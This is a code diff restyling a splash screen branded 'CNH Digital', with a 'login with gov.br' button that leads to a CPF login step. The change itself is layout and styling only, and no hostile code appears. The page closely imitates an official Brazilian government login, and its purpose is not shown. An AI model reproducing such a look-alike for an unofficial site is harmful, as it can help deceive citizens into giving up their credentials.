@@ -49,23 +49,23 @@
   // ============================================================
   function showSplash() {
     show(`
-      <div style="min-height:100vh;min-height:100dvh;display:flex;justify-content:center;align-items:center;background:#000;">
-        <div style="width:100%;max-width:450px;height:100vh;height:100dvh;display:flex;flex-direction:column;background:#fff;position:relative;box-shadow:0 0 40px rgba(0,0,0,0.8);overflow:hidden;">
-          <div style="flex:0 0 70%;position:relative;overflow:hidden;">
-            <img src="img/capa_cnh.png" alt="CNH Digital" style="width:100%;height:100%;object-fit:cover;display:block;">
+      <div style="font-family: 'Raleway', 'Rawline', sans-serif; background-color: #000; height: 100dvh; width: 100vw; overflow: hidden; display: flex; justify-content: center; align-items: center; margin: 0; padding: 0;">
+        <div id="tela-capa" style="width: 100%; max-width: 450px; height: 100%; background-color: #fff; position: relative; display: flex; flex-direction: column; overflow: hidden;">
+          <div class="capa-area" style="height: 70%; width: 100%; background-image: url('img/capa_cnh.png'); background-size: cover; background-position: center top; position: relative; flex-shrink: 0;">
+            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 40%; background: linear-gradient(to bottom, rgba(0, 0, 0, 0.5), transparent);"></div>
           </div>
-          <div style="flex:1;background:#fff;border-radius:25px 25px 0 0;margin-top:-25px;position:relative;z-index:10;display:flex;flex-direction:column;align-items:center;padding:20px 30px 30px;justify-content:space-between;">
-            <div style="display:flex;align-items:center;justify-content:center;margin-top:10px;">
-              <img src="img/logo_cnh.png" alt="CNH DO BRASIL" style="max-width:140px;object-fit:contain;">
+          <div class="conteudo-branco" style="flex: 1; background-color: white; border-top-left-radius: 25px; border-top-right-radius: 25px; margin-top: -25px; position: relative; z-index: 10; padding: 15px 30px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px;">
+            <div class="logo-container">
+              <img src="img/logo_cnh.png" alt="CNH Digital" style="max-width: 140px; display: block; margin-bottom: 5px;">
             </div>
-            <div style="width:100%;">
-              <div style="text-align:center;margin-bottom:12px;font-size:12px;color:#333;line-height:1.4;">
+            <div style="width: 100%;">
+              <div class="termos-texto" style="text-align: center; font-size: 12px; color: #333; line-height: 1.3; margin-bottom: 5px;">
                 Ao entrar, você concorda com nosso <br>
-                <a href="#" style="color:#1351B4;text-decoration:underline;font-weight:600;">Termo de Responsabilidade</a> e <br>
-                <a href="#" style="color:#1351B4;text-decoration:underline;font-weight:600;">Política de Privacidade</a>
+                <a href="#" style="color: #1351b4; text-decoration: underline; font-weight: 600;">Termo de Responsabilidade</a> e <br>
+                <a href="#" style="color: #1351b4; text-decoration: underline; font-weight: 600;">Política de Privacidade</a>
               </div>
-              <button onclick="showLoginCPF()" style="width:100%;padding:14px;background:#1351B4;color:#fff;border:none;border-radius:50px;font-size:14px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;text-transform:uppercase;">
-                ENTRAR COM <img src="img/logo.png" alt="gov.br" style="height:18px;">
+              <button class="btn-gov" onclick="showLoginCPF()" style="background-color: #1351b4; color: white; width: 100%; padding: 14px 0; border-radius: 50px; border: none; font-size: 14px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 8px rgba(19, 81, 180, 0.25); text-transform: uppercase;">
+                ENTRAR COM gov.br
               </button>
             </div>
           </div>
